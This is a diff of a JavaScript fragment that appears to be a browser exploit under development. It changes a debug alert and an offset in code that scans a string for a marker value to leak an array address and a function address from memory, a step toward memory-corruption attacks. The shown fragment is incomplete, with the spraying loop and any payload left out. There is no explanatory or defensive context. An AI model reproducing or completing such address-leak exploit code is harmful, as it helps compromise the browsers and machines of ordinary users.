@@ -1,5 +1,5 @@
 <script>	
-alert("start33");
+alert("start34");
 function func(){
 for(var i=0;i<0x1000;i++){ 
 
@@ -133,7 +133,7 @@ while(s1.charCodeAt(a)!=0x6666){
  a+=1;
 }
 var arr_addr=(s1.charCodeAt(a-2)<<16)+s1.charCodeAt(a-3)
-var func_addr=(s1.charCodeAt(a-5)<<16)+s1.charCodeAt(a+4);
+var func_addr=(s1.charCodeAt(a+5)<<16)+s1.charCodeAt(a+4);
 alert(arr_addr.toString(16));
 alert(func_addr.toString(16));
 a=arr_addr/2;
